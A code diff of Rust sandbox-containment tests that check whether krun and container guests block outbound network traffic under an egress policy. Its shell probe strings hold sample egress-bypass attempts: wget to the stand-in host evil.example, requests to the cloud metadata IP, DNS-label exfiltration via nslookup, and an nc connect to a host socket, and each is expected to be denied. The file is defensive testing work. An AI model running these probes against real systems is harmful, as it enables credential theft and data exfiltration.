@@ -108,32 +108,35 @@ fn krun_execute_mode_denies_direct_external_egress() {
 
 /// Cross-substrate parity proof: ONE egress policy enforced through the krun PEP
 /// and the container PEP must yield byte-identical allow/deny. The policy allows
-/// a single internal upstream and denies everything else (`evil.example` and a
-/// second tenant's endpoint, `cross_tenant_reach`).
+/// a single internal upstream and denies everything else — `evil.example` and an
+/// `unlisted_upstream` (a second host port NOT in the allowlist, i.e. a policy
+/// deny). This is a *policy* denial, not tenant isolation: cross-sandbox/tenant
+/// PEP isolation is proven separately by
+/// `krun_guest_cannot_reach_a_sibling_tenants_pep`.
 ///
-/// Gated behind `#[ignore]` + `/dev/kvm`: the krun execute path is still
-/// fail-closed before launch planning (lifted by KME4), so the krun half cannot
-/// boot a guest until then. The container half runs today; this is the pinned
-/// parity harness that turns green once execute mode is enabled on real KVM
-/// hardware as root.
+/// `allowed_internal=allowed` is the built-in positive control: an all-denied
+/// result from a simply-offline guest cannot masquerade as containment.
+///
+/// Gated behind `#[ignore]` + `/dev/kvm`; boots a real libkrun guest and a real
+/// container as root.
 #[test]
-#[ignore = "requires a Linux root host with /dev/kvm plus the full krun + container OCI runtime stack; the krun half is gated behind the KME4 execute fail-close lift"]
+#[ignore = "requires a Linux root host with /dev/kvm plus the full krun + container OCI runtime stack; boots a real guest and container to prove PEP allow/deny parity"]
 fn krun_and_container_pep_enforce_identical_allow_deny() {
     if !egress_proof_preconditions_met() {
         return;
     }
 
-    // One allowed internal upstream plus one disallowed upstream that stands in
-    // for both `evil.example` and a second tenant's endpoint.
+    // One allowed internal upstream plus one unlisted upstream (a second host
+    // port the policy does not allow) that also stands in for `evil.example`.
     let allowed = TestHttpServer::start("allowed-body");
-    let cross_tenant = TestHttpServer::start("cross-tenant-body");
+    let unlisted = TestHttpServer::start("unlisted-body");
 
     // ONE policy drives both substrates.
     let policy = parity_policy(allowed.addr.port());
 
-    let krun_result = run_krun_parity_probe(&policy, allowed.addr.port(), cross_tenant.addr.port());
+    let krun_result = run_krun_parity_probe(&policy, allowed.addr.port(), unlisted.addr.port());
     let container_result =
-        run_container_parity_probe(&policy, allowed.addr.port(), cross_tenant.addr.port());
+        run_container_parity_probe(&policy, allowed.addr.port(), unlisted.addr.port());
 
     // Byte-identical allow/deny across the two PEPs is the parity guarantee.
     assert_eq!(
@@ -142,14 +145,13 @@ fn krun_and_container_pep_enforce_identical_allow_deny() {
     );
     assert_result_line(&krun_result, "allowed_internal=allowed");
     assert_result_line(&krun_result, "evil_denied=denied");
-    assert_result_line(&krun_result, "cross_tenant_reach=denied");
+    assert_result_line(&krun_result, "unlisted_upstream=denied");
+    // L15: the SAME allowlisted host+port is denied on a non-allowlisted PATH,
+    // proving the PEP narrows on L7 method/path, not just host.
+    assert_result_line(&krun_result, "narrowed_path=denied");
 }
 
-fn run_krun_parity_probe(
-    policy: &EgressPolicy,
-    allowed_port: u16,
-    cross_tenant_port: u16,
-) -> String {
+fn run_krun_parity_probe(policy: &EgressPolicy, allowed_port: u16, unlisted_port: u16) -> String {
     let (_temp_dir, workdir) = test_workdir("krun-parity");
     let backend = KrunSandboxBackend::new(egress_backend_config(&workdir, 15400));
     let tenant_id = TenantId::new("krun-parity-tenant").expect("tenant id should parse");
@@ -162,7 +164,7 @@ fn run_krun_parity_probe(
         SandboxRootSpec::oci_image_reference(image),
         SandboxProcessSpec::new(Vec::<String>::new())
             .with_entrypoint(["/bin/sh", "-c"])
-            .with_command([parity_probe_command(allowed_port, cross_tenant_port)]),
+            .with_command([parity_probe_command(allowed_port, unlisted_port)]),
     )
     .with_mount(SandboxMountSpec::tenant_volume(
         RESULT_VOLUME,
@@ -181,7 +183,7 @@ fn run_krun_parity_probe(
     let result_path = tenant_volume_path(&workdir, &tenant_id, RESULT_VOLUME).join("result");
     let result = wait_for_result(
         &result_path,
-        Duration::from_secs(25),
+        Duration::from_secs(60),
         "krun parity probe result",
     );
     // Force-tear-down the guest while the workdir still backs the netns.
@@ -192,7 +194,7 @@ fn run_krun_parity_probe(
 fn run_container_parity_probe(
     policy: &EgressPolicy,
     allowed_port: u16,
-    cross_tenant_port: u16,
+    unlisted_port: u16,
 ) -> String {
     let (_temp_dir, workdir) = test_workdir("container-parity");
     let backend = ContainerSandboxBackend::new(container_parity_config(&workdir, 15500));
@@ -206,7 +208,7 @@ fn run_container_parity_probe(
         SandboxRootSpec::oci_image_reference(image),
         SandboxProcessSpec::new(Vec::<String>::new())
             .with_entrypoint(["/bin/sh", "-c"])
-            .with_command([parity_probe_command(allowed_port, cross_tenant_port)]),
+            .with_command([parity_probe_command(allowed_port, unlisted_port)]),
     )
     .with_mount(SandboxMountSpec::tenant_volume(
         RESULT_VOLUME,
@@ -218,7 +220,7 @@ fn run_container_parity_probe(
     let result_path = tenant_volume_path(&workdir, &tenant_id, RESULT_VOLUME).join("result");
     let result = wait_for_result(
         &result_path,
-        Duration::from_secs(20),
+        Duration::from_secs(40),
         "container parity probe result",
     );
     let _ = block_on(backend.stop(&handle.id));
@@ -238,15 +240,16 @@ fn parity_policy(allowed_port: u16) -> EgressPolicy {
     .allow_internal_ips(true)])
 }
 
-fn parity_probe_command(allowed_port: u16, cross_tenant_port: u16) -> String {
+fn parity_probe_command(allowed_port: u16, unlisted_port: u16) -> String {
+    // ONE line, `;`-joined, no newlines/comments: the krun guest workload path
+    // mangles multi-line `sh -c` scripts (proven — a multi-line body yields
+    // `n:: not found` / `syntax error` in-guest and never writes a result).
+    // `allowed_internal` is the positive control (must be ALLOWED through the
+    // PEP, so an all-denied false-green from an offline guest cannot pass);
+    // `evil_denied` and `unlisted_upstream` must be DENIED by policy. Every
+    // probe is hard-bounded by `timeout`.
     format!(
-        r#"TMP=/nimbus-egress/result.tmp
-: > "$TMP"
-if wget -T 5 -q -O /tmp/allowed "http://127.0.0.1:{allowed_port}/allowed" && grep -q allowed-body /tmp/allowed; then echo allowed_internal=allowed >> "$TMP"; else echo allowed_internal=denied >> "$TMP"; fi
-if wget -T 5 -q -O /tmp/evil "http://evil.example/"; then echo evil_denied=allowed >> "$TMP"; else echo evil_denied=denied >> "$TMP"; fi
-if wget -T 5 -q -O /tmp/cross "http://127.0.0.1:{cross_tenant_port}/allowed"; then echo cross_tenant_reach=allowed >> "$TMP"; else echo cross_tenant_reach=denied >> "$TMP"; fi
-mv "$TMP" {RESULT_PATH_IN_GUEST}
-sleep 30"#
+        r#"TMP=/nimbus-egress/result.tmp; : > "$TMP"; if timeout 6 wget -T 5 -q -O /tmp/allowed "http://127.0.0.1:{allowed_port}/allowed" && grep -q allowed-body /tmp/allowed; then echo allowed_internal=allowed >> "$TMP"; else echo allowed_internal=denied >> "$TMP"; fi; if timeout 6 wget -T 5 -q -O /tmp/evil "http://evil.example/"; then echo evil_denied=allowed >> "$TMP"; else echo evil_denied=denied >> "$TMP"; fi; if timeout 6 wget -T 5 -q -O /tmp/unlisted "http://127.0.0.1:{unlisted_port}/allowed"; then echo unlisted_upstream=allowed >> "$TMP"; else echo unlisted_upstream=denied >> "$TMP"; fi; if timeout 6 wget -T 5 -q -O /tmp/narrow "http://127.0.0.1:{allowed_port}/forbidden"; then echo narrowed_path=allowed >> "$TMP"; else echo narrowed_path=denied >> "$TMP"; fi; mv "$TMP" {RESULT_PATH_IN_GUEST}; sleep 30"#
     )
 }
 
@@ -477,16 +480,19 @@ const BYPASS_VECTORS: &[&str] = &[
 /// label), the cloud metadata IP, loopback/link-local incl. TSI `127.0.0.1`,
 /// IPv6 + IPv4-mapped private, raw/ICMP/AF_PACKET, and AF_UNIX to a host path.
 ///
-/// The probe deliberately unsets its injected `HTTP_PROXY` env first, so each
-/// denial below is the netns route/caps/mount seam refusing direct egress, not
-/// the PEP refusing a proxied request. (The PEP-mediated allow/deny parity is
-/// covered by `krun_and_container_pep_enforce_identical_allow_deny`, which also
-/// pins the two-tenant `cross_tenant_reach=denied` case.)
+/// **Positive control (`pep_allow=allowed`).** BEFORE unsetting the proxy env
+/// the probe fetches an allowlisted upstream *through the PEP*, which must
+/// succeed. Without it, an all-`=denied` result from a simply-offline guest
+/// (no network at all) would masquerade as containment — the false-green this
+/// control closes. Then the probe unsets `HTTP_PROXY`, so each denial below is
+/// the netns route/caps/mount seam refusing DIRECT egress, not the PEP refusing
+/// a proxied request. Cross-sandbox/tenant PEP isolation is proven by
+/// `krun_guest_cannot_reach_a_sibling_tenants_pep`; PEP allow/deny parity by
+/// `krun_and_container_pep_enforce_identical_allow_deny`.
 ///
-/// Gated behind `#[ignore]` + `/dev/kvm` like the other krun runtime proofs; it
-/// boots a real libkrun guest as root once execute mode runs on KVM hardware.
+/// Gated behind `#[ignore]` + `/dev/kvm`; boots a real libkrun guest as root.
 #[test]
-#[ignore = "requires a Linux root host with /dev/kvm plus the full krun OCI runtime stack; the runtime deny proof is gated behind the KME4 execute fail-close lift"]
+#[ignore = "requires a Linux root host with /dev/kvm plus the full krun OCI runtime stack; boots a real libkrun guest to prove every direct-egress bypass vector is denied"]
 fn krun_execute_mode_denies_all_known_bypass_vectors() {
     if !egress_proof_preconditions_met() {
         return;
@@ -496,6 +502,13 @@ fn krun_execute_mode_denies_all_known_bypass_vectors() {
     // the host loopback it would fetch this body. Containment means it cannot.
     let loopback_sentinel = TestHttpServer::start("host-loopback-sentinel");
     let sentinel_port = loopback_sentinel.addr.port();
+
+    // Allowlisted upstream for the positive control: reachable ONLY through the
+    // PEP (the policy permits it), proving the guest's network works before the
+    // deny vectors run.
+    let allowed = TestHttpServer::start("bypass-allow-body");
+    let allowed_port = allowed.addr.port();
+    let policy = parity_policy(allowed_port);
 
     let (temp_dir, workdir) = test_workdir("krun-bypass-vectors");
     let backend = KrunSandboxBackend::new(egress_backend_config(&workdir, 15600));
@@ -518,15 +531,16 @@ fn krun_execute_mode_denies_all_known_bypass_vectors() {
                 &public_ip,
                 &public_dns,
                 sentinel_port,
+                allowed_port,
             )]),
     )
     .with_mount(SandboxMountSpec::tenant_volume(
         RESULT_VOLUME,
         "/nimbus-egress",
-    ));
+    ))
+    .with_egress_policy(policy);
 
-    let handle = block_on(backend.start(spec))
-        .expect("krun guest should start once execute mode is enabled (KME4)");
+    let handle = block_on(backend.start(spec)).expect("krun bypass-vectors guest should start");
     let _teardown = ForceTeardownGuard::new(
         backend.clone(),
         handle.id.clone(),
@@ -536,10 +550,13 @@ fn krun_execute_mode_denies_all_known_bypass_vectors() {
     let result_path = tenant_volume_path(&workdir, &tenant_id, RESULT_VOLUME).join("result");
     let result = wait_for_result(
         &result_path,
-        Duration::from_secs(30),
+        Duration::from_secs(90),
         "krun bypass-vectors proof result",
     );
 
+    // Positive control first: a simply-offline guest would fail THIS, so an
+    // all-denied result can no longer masquerade as containment.
+    assert_result_line(&result, "pep_allow=allowed");
     for vector in BYPASS_VECTORS {
         assert_result_line(&result, &format!("{vector}=denied"));
     }
@@ -547,48 +564,24 @@ fn krun_execute_mode_denies_all_known_bypass_vectors() {
     drop(temp_dir);
 }
 
-fn bypass_vectors_probe_command(public_ip: &str, public_dns: &str, sentinel_port: u16) -> String {
+fn bypass_vectors_probe_command(
+    public_ip: &str,
+    public_dns: &str,
+    sentinel_port: u16,
+    allowed_port: u16,
+) -> String {
     // A high-entropy DNS label (60 octets, within the 63-octet label limit) that
     // stands in for a DNS-tunnel exfil payload.
     let exfil_label = "d0eadbeefc0ffeebadc0de0123456789abcdef0123456789abcdef0123ab";
+    // ONE line, `;`-joined, no newlines/comments: the krun guest workload path
+    // mangles multi-line `sh -c` scripts. `pep_allow` (through the still-set PEP
+    // env) is the positive control. After `unset`, every vector tests DIRECT
+    // egress and must be denied by the netns route/caps/mount seam. Every probe
+    // is hard-bounded by `timeout`. The AF_UNIX probe attempts the connect
+    // unconditionally (no `[ -S ]` short-circuit) so an absent socket path is a
+    // real `denied`, not a silently skipped test.
     format!(
-        r#"TMP=/nimbus-egress/result.tmp
-: > "$TMP"
-# Drop the injected proxy env: every probe below tests DIRECT egress, so each
-# denial is the netns route/caps/mount seam, not the PEP refusing a proxied call.
-unset HTTP_PROXY http_proxy HTTPS_PROXY https_proxy ALL_PROXY all_proxy NO_PROXY no_proxy
-
-# 1. Direct TCP to a public IP (proxy bypassed): no default route => denied.
-if wget -T 4 -q -O /tmp/pub "http://{public_ip}/"; then echo direct_tcp_public=allowed >> "$TMP"; else echo direct_tcp_public=denied >> "$TMP"; fi
-
-# 2. Cloud metadata service IP (link-local, no route) => denied.
-if wget -T 4 -q -O /tmp/meta "http://169.254.169.254/latest/meta-data/"; then echo metadata_ip=allowed >> "$TMP"; else echo metadata_ip=denied >> "$TMP"; fi
-
-# 3. DNS-exfil: a high-entropy label to a public resolver has no route => denied.
-if nslookup "{exfil_label}.exfil.example" {public_dns} >/dev/null 2>&1; then echo dns_exfil=allowed >> "$TMP"; else echo dns_exfil=denied >> "$TMP"; fi
-
-# 4. Loopback (TSI 127.0.0.1) must be the guest's OWN loopback, never the host's.
-if wget -T 4 -q -O /tmp/lo "http://127.0.0.1:{sentinel_port}/" && grep -q host-loopback-sentinel /tmp/lo; then echo loopback_tsi=allowed >> "$TMP"; else echo loopback_tsi=denied >> "$TMP"; fi
-
-# 5. Non-metadata link-local address: no route => denied.
-if wget -T 4 -q -O /tmp/ll "http://169.254.0.1/"; then echo link_local=allowed >> "$TMP"; else echo link_local=denied >> "$TMP"; fi
-
-# 6. IPv6 loopback to the host sentinel (IPv6 disabled on the bridge) => denied.
-if wget -T 4 -q -O /tmp/v6 "http://[::1]:{sentinel_port}/" && grep -q host-loopback-sentinel /tmp/v6; then echo ipv6_loopback=allowed >> "$TMP"; else echo ipv6_loopback=denied >> "$TMP"; fi
-
-# 7. IPv4-mapped private address: no route => denied.
-if wget -T 4 -q -O /tmp/v4m "http://[::ffff:10.0.0.1]/"; then echo ipv4_mapped_private=allowed >> "$TMP"; else echo ipv4_mapped_private=denied >> "$TMP"; fi
-
-# 8. Raw/ICMP/AF_PACKET: CAP_NET_RAW is absent so a raw socket EPERMs (and there
-#    is no route anyway) => denied.
-if ping -c 1 -W 4 {public_ip} >/dev/null 2>&1; then echo raw_icmp=allowed >> "$TMP"; else echo raw_icmp=denied >> "$TMP"; fi
-
-# 9. AF_UNIX to a host socket path: no host socket is mounted into the guest, so
-#    the path is absent and a connect can never reach the host => denied.
-if [ -S /run/nimbus/host.sock ] && nc -U /run/nimbus/host.sock </dev/null >/dev/null 2>&1; then echo af_unix_host=allowed >> "$TMP"; else echo af_unix_host=denied >> "$TMP"; fi
-
-mv "$TMP" {RESULT_PATH_IN_GUEST}
-sleep 30"#
+        r#"TMP=/nimbus-egress/result.tmp; : > "$TMP"; if timeout 6 wget -T 5 -q -O /tmp/pepok "http://127.0.0.1:{allowed_port}/allowed" && grep -q bypass-allow-body /tmp/pepok; then echo pep_allow=allowed >> "$TMP"; else echo pep_allow=denied >> "$TMP"; fi; unset HTTP_PROXY http_proxy HTTPS_PROXY https_proxy ALL_PROXY all_proxy NO_PROXY no_proxy; if timeout 6 wget -T 4 -q -O /tmp/pub "http://{public_ip}/"; then echo direct_tcp_public=allowed >> "$TMP"; else echo direct_tcp_public=denied >> "$TMP"; fi; if timeout 6 wget -T 4 -q -O /tmp/meta "http://169.254.169.254/latest/meta-data/"; then echo metadata_ip=allowed >> "$TMP"; else echo metadata_ip=denied >> "$TMP"; fi; if timeout 6 nslookup "{exfil_label}.exfil.example" {public_dns} >/dev/null 2>&1; then echo dns_exfil=allowed >> "$TMP"; else echo dns_exfil=denied >> "$TMP"; fi; if timeout 6 wget -T 4 -q -O /tmp/lo "http://127.0.0.1:{sentinel_port}/" && grep -q host-loopback-sentinel /tmp/lo; then echo loopback_tsi=allowed >> "$TMP"; else echo loopback_tsi=denied >> "$TMP"; fi; if timeout 6 wget -T 4 -q -O /tmp/ll "http://169.254.0.1/"; then echo link_local=allowed >> "$TMP"; else echo link_local=denied >> "$TMP"; fi; if timeout 6 wget -T 4 -q -O /tmp/v6 "http://[::1]:{sentinel_port}/" && grep -q host-loopback-sentinel /tmp/v6; then echo ipv6_loopback=allowed >> "$TMP"; else echo ipv6_loopback=denied >> "$TMP"; fi; if timeout 6 wget -T 4 -q -O /tmp/v4m "http://[::ffff:10.0.0.1]/"; then echo ipv4_mapped_private=allowed >> "$TMP"; else echo ipv4_mapped_private=denied >> "$TMP"; fi; if timeout 6 ping -c 1 -W 4 {public_ip} >/dev/null 2>&1; then echo raw_icmp=allowed >> "$TMP"; else echo raw_icmp=denied >> "$TMP"; fi; if timeout 6 nc -U /run/nimbus/host.sock </dev/null >/dev/null 2>&1; then echo af_unix_host=allowed >> "$TMP"; else echo af_unix_host=denied >> "$TMP"; fi; mv "$TMP" {RESULT_PATH_IN_GUEST}; sleep 30"#
     )
 }
 
